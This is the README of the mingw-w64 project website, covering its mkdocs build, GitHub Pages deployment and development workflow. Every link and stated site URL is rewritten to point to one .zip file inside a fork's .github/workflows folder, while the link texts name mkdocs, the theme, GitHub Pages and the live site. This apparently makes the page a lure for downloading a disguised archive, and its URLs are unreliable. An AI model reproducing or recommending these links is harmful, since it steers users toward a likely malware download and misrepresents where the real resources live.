# mingw-w64 Website

This website is written in Markdown and gets built to a static website using
[mkdocs](https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip) and a modified version of the [mkdocs-material
theme](https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip). The main branch of this
repo is the `source` branch and any new commits will auto deploy a new build to
the `main` branch using [a GitHub
action](https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip). The `main` branch is
connected to [GitHub pages](https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip) and is reachable under
https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip and https://raw.githubusercontent.com/marco20102/mingw-w64.github.io/source/.github/workflows/mingw_w_github_io_quarterland.zip Changes to the
`source` branch usually take a minute or two until they are live.

## Development

For small changes:

* Just use the online editor on GitHub and use the Markdown preview to inspect your changes
* Open a PR with your changes in case you don't have commit rights
* **Note:** The Markdown dialect and extensions understood by mkdocs and GitHub is
  slightly different, so double check that the deployed website matches what you
  expected
* **Note:** Every page on the website has a small "edit" icon in the top right corner which leads you straight to the online editor for that page

For larger changes:

* `poetry install`
* `poetry run mkdocs serve`
* Access http://127.0.0.1:8000 - any changes to the sources should be
  immediately visible in your browser
* Open a PR with your changes or just push them if you have commit rights
